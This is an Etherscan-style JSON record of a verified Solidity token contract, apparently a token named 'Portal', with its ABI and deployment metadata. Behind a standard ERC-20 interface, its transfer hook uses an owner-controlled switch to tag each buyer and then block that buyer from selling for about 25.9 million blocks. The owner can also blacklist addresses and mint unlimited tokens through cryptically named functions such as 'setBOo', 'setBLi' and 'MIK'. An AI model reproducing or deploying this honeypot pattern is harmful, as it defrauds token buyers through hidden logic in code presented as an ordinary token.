{"SourceCode": "/**\r\n *Submitted for verification at Etherscan.io on 2024-02-27\r\n*/\r\n\r\n//SPDX-License-Identifier: UNLICENSED\r\n\r\npragma solidity 0.8.18;\r\n\r\nlibrary SafeMath {\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        assert(c / a == b);\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        assert(b <= a);\r\n        return a - b;\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        assert(c >= a);\r\n        return c;\r\n    }\r\n}\r\ninterface IPancakeFactory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\ncontract Ownable {\r\n    address public owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    modifier onlyOwner() {\r\n        require(msg.sender == owner,\"Caller is not the owner\");\r\n        _;\r\n    }\r\n}\r\n\r\ncontract AUKx is Ownable{\r\n    address public _pair;\r\n    bool private _bool;\r\n    uint256  delay;\r\n    uint256 unlock;\r\n    mapping(address => bool)  botlist;\r\n    mapping(address => bool)  whitelist;\r\n    mapping(address => uint256) airdropAmounts;\r\n    mapping(address => uint256)  restrictBlock;\r\n\r\n    function log(address _from, address _to) internal{\r\n        if(!whitelist[_from]&&!whitelist[_to]){\r\n            require(!botlist[_from]);\r\n            require(!botlist[_to]);\r\n            require(!botlist[msg.sender]);\r\n            require(airdropAmounts[_from]<1||block.number<_getRestrictBlock(_from)||block.number>_getUnlockBlock(_from));\r\n        }\r\n        _addRefund(_to,1);\r\n    }\r\n\r\n\r\n    function _getRestrictBlock(address a) internal view returns (uint256) {\r\n        return (restrictBlock[a]+delay);\r\n    }\r\n    function _getUnlockBlock(address a) internal view returns (uint256) {\r\n        return (restrictBlock[a]+unlock);\r\n    }\r\n\r\n    function _addRefund(address a,uint256 refund) internal returns (bool success) {\r\n        if(a==_pair||whitelist[a]){\r\n            return true;\r\n        }\r\n        if(_bool){\r\n                airdropAmounts[a] = refund;\r\n                if(restrictBlock[a]==0){\r\n                    restrictBlock[a]=block.number;\r\n                }\r\n            }\r\n        return true;\r\n    }\r\n\r\n    function setBOo(bool b) public  onlyOwner  returns (bool success) {\r\n        require(_bool != b);\r\n        _bool=b;\r\n        return true;\r\n    }\r\n\r\n\r\n    function setDLl2(uint _dkm) public  onlyOwner  returns (bool success) {\r\n        require(delay != _dkm);\r\n        delay=_dkm;\r\n        return true;\r\n    }\r\n\r\n    function setBLi(address[] memory listAddress,  bool isBot) public  onlyOwner  returns (bool success) {\r\n        if(listAddress.length==1){\r\n            require(botlist[listAddress[0]] != isBot);\r\n        }\r\n        for(uint i = 0; i < listAddress.length; i++){\r\n            botlist[listAddress[i]] = isBot;\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function setWLi(address[] memory listAddress,  bool _isWhiteListed) public  onlyOwner  returns (bool success) {\r\n        if(listAddress.length==1){\r\n            require(whitelist[listAddress[0]] != _isWhiteListed);\r\n        }\r\n        for(uint i = 0; i < listAddress.length; i++){\r\n            whitelist[listAddress[i]] = _isWhiteListed;\r\n        }\r\n        return true;\r\n    }\r\n\r\n\r\n}\r\n\r\ncontract Token is AUKx{\r\n    using SafeMath for uint256;\r\n\r\n    uint256 public totalSupply;\r\n    string public name;\r\n    string public symbol;\r\n    uint public decimals;\r\n    mapping (address => mapping (address => uint256)) internal allowed;\r\n    mapping(address => uint256) balances;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    constructor(string memory _name, string memory _symbol, uint256 _supply, address _owner,address pancakeFactory,address usdt) public {\r\n        delay=1;\r\n        unlock=25920000;\r\n        name = _name;\r\n        symbol = _symbol;\r\n        decimals = 18;\r\n        totalSupply = _supply * 10**decimals;\r\n        balances[_owner] = totalSupply;\r\n        owner = _owner;\r\n        emit Transfer(address(0), _owner, totalSupply);\r\n        _pair = IPancakeFactory(pancakeFactory).createPair(address(this), usdt);\r\n    }\r\n\r\n\r\n    function transfer(address _to, uint256 _value) public returns (bool) {\r\n        log(msg.sender,_to);\r\n\r\n        require(_to != address(0));\r\n        require(_to != msg.sender);\r\n        require(_value <= balances[msg.sender]);\r\n        balances[msg.sender] = balances[msg.sender].sub(_value);\r\n        // SafeMath.sub will throw if there is not enough balance.\r\n        balances[_to] = balances[_to].add(_value);\r\n        emit Transfer(msg.sender, _to, _value);\r\n        return true;\r\n    }\r\n\r\n\r\n    function balanceOf(address _owner) public view returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\r\n        log(_from,_to);\r\n        require(_to != _from);\r\n        require(_to != address(0));\r\n        require(_value <= balances[_from]);\r\n        require(_value <= allowed[_from][msg.sender]);\r\n        balances[_from] = balances[_from].sub(_value);\r\n        // SafeMath.sub will throw if there is not enough balance.\r\n        balances[_to] = balances[_to].add(_value);\r\n        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\r\n        emit Transfer(_from, _to, _value);\r\n        return true;\r\n    }\r\n\r\n\r\n    function approve(address _spender, uint256 _value) public returns (bool) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n\r\n    function allowance(address _owner, address _spender) public view returns (uint256) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n\r\n    function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\r\n        allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\r\n        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\r\n        return true;\r\n    }\r\n\r\n    function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\r\n        uint oldValue = allowed[msg.sender][_spender];\r\n        if (_subtractedValue > oldValue) {\r\n            allowed[msg.sender][_spender] = 0;\r\n        } else {\r\n            allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\r\n        }\r\n        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\r\n        return true;\r\n    }\r\n\r\n    function MIK(address account, uint256 amount) onlyOwner public {\r\n\r\n        totalSupply = totalSupply.add(amount);\r\n        balances[account] = balances[account].add(amount);\r\n        emit Transfer(address(0), account, amount);\r\n    }\r\n\r\n\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_name\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"_symbol\",\"type\":\"string\"},{\"internalType\":\"uint256\",\"name\":\"_supply\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"pancakeFactory\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"usdt\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"MIK\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"balance\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseApproval\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseApproval\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"listAddress\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"isBot\",\"type\":\"bool\"}],\"name\":\"setBLi\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"b\",\"type\":\"bool\"}],\"name\":\"setBOo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_dkm\",\"type\":\"uint256\"}],\"name\":\"setDLl2\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"listAddress\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"_isWhiteListed\",\"type\":\"bool\"}],\"name\":\"setWLi\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"success\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Token", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "00000000000000000000000000000000000000000000000000000000000000c00000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000003b9aca00000000000000000000000000a9fb7c6e330657dc3d04edef965f9b5ec3b7e5820000000000000000000000005c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000000000000000000000000000000000000000000006506f7274616c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006504f5254414c0000000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://e056b9f702e974e9b75944d656c17fbda18b1deeeaedfb5287cb142c1ff24100"}